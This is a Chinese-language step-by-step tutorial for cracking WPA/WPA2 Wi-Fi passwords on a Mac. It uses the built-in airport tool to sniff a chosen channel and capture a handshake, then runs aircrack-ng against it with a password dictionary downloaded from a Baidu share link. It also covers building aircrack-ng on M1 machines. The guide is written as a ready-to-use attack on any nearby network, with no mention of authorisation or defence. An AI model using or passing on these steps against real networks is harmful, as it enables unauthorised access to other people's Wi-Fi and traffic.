# 破解WIFI

无线信号是加密的，如果你要连接无线路由器，就要给路由器发送一个请求，请求和无线路由器建立连接，学名叫握手包。这个包里面包含了你发送过去的一个密码，但是这个密码是加密的。

我们要破解的无线网络密码我们首先要抓到这个包，里面有加密过的密码，我们只要抓到这个包，然后利用工具进行密码本去批量匹配，匹配成功就可以实现Wi-Fi密码破解。

一些关键字:
```markdown
* `AP(Access Point)`: 网络接入点，是一种连接无线或有线网络的设备。就是俗称的路由器。
* `MAC(Media Access Control Address)`: 相当于网卡的身份证，MAC 地址本身是不能修改，但是可以通过伪造MAC 地址欺骗AP。
* `WEP(Wireless Encryption Protocol)`: 无线加密协议。很早的一种加密协议，容易破解。
* `WPA/WPA2(Wi-FiProtected Access)`: 基于WEP更安全的加密系统。
* `Handshake`:握手。请求和无线路由器建立连接的一个包
* `IV(Initialization Vector)`:初始化向量。
* `airport`: Mac自带的一款测试无线的工具，可以借助该工具监听无线获取无线发送的数据包。
* `aircrack-ng`: Aircrack-ng是一个与802.11标准的无线网络分析有关的安全软件，主要功能有：网络侦测，数据包嗅探，WEP和WPA/WPA2-PSK破解。Aircrack-ng可以工作在任何支持监听模式的无线网卡上并嗅探802.11a,802.11b, 802.11g的数据。
``` 

>如果使用`airport`指令查看wifi信息时, `SECURITY (auth/unicast/group)` 显示当前WiFi的加密方案是 `RSN(PSK,FT-PSK/AES/AES) `,意味着wifi使用WPA3版本的加密，目前不能破解。

## wifi破解过程
1. 安装`MacPorts`,[下载MacPorts地址](https://www.macports.org/install.php),选择对应的版本进行安装。(提醒：安装时断网，不然极有可能卡死)

2. 更新`MacPorts`,打开终端，输入命令（两次）
    ```shell
    sudo port selfupdate
    ```
3. 更新完成后，安装`aircrack-ng`。输入命令
    ```shell
    sudo port install aircrack-ng
    ```
> M1芯片需要下载源码进行手动编译
4. 使用`airport`工具查看 Wifi 信息, airport 是苹果自带工具，默认路径为`/System/Library/PrivateFrameworks/Apple80211.framework/Versions/A/Resources/airport`,可以直接在终端输入以下指令
    ```shell
    sudo /System/Library/PrivateFrameworks/Apple80211.framework/Versions/A/Resources/airport -s
    ```
> SSID 是 wifi名称，RSSI 是信号强度，CHANNEL 是信道。
5. 获取本机网卡信息,本机电脑网卡为 `en0`。输入命令
    ```shell
    ifconfig
    ```
6. 监听 Wifi 握手包`handshake`,**en0为电脑网卡，13为监听的信道**,想监听哪个wifi把信道改成它的就可以。命令如下：
    ```shell
    sudo /System/Library/PrivateFrameworks/Apple80211.framework/Versions/A/Resources/airport en0 sniff 13
    ```
7. 监听之后，Wi-Fi 图标会变化，使用 `ctrl+c` 停止监听，系统会将监听到的数据cap文件保存到本地`/private/tmp`文件夹下。
打开cap文件，查看cap文件中的数据是否被抓取到，输入命令查看
```shell
sudo aircrack-ng /private/tmp/airportSniffhKI8Kg.cap
```
> 如果要查询的路由列表的 Encryption中`（0 handshake）`是抓包失败，`（1 handshake）`则是抓包成功，否者要回到第1步重新抓取。**（抓包时需要这段时间内有人重新连接了wifi才能抓到 WPA(1 handshake)的数据,建议长时间监听wifi信道）**

8. 下载wifi密码字典, 瞎子啊链接:https://pan.baidu.com/s/1uSHL7PVbLqkZZqAZhb6Epw 密码: gl1t

9. 使用`aircrack-ng -w 密码字典  握手包文件`指令进行破解
```shell
sudo aircrack-ng -w dic.txt /tmp/airportSniffhKI8Kg.cap
```

提示`「Index number of target network ?」`时，输入 `Encryption` 中为`（1 handshake）`数据的行号。

等待破解结果...，中断破解过程可以直接按 `command + c` 组合键退出。破解过程所需时间长短受电脑硬件配置、字典体积大小的影响。如果dic.txt字典破解失败，则可以换其它字典进行破解，直到破解成功。


## M1芯片安装 
[下载aircrack-ng源码](https://github.com/aircrack-ng/aircrack-ng/releases/tag/1.7)，解压后进入根目录在命令行进行以下操作:
```shell
autoreconf -vif
env CPPFLAGS="-Wno-deprecated-declarations" ./configure --with-experimental
make
make check
```
编译完成后在当前目录下找到编译好的可执行文件，因为可执行文件在当前目录下，运行时进入当前目录使用`./aircrack-ng `即可使用。


## 参考文档
* [MAC系统下破解WIFI密码](https://www.cnblogs.com/hzxll/p/16271446.html)   
* [Aircack-ng教程](https://www.wangan.com/docs/1401)
* [暴力破解Wi-Fi密码（Mac M1）](https://blog.csdn.net/x319427393/article/details/126178468)
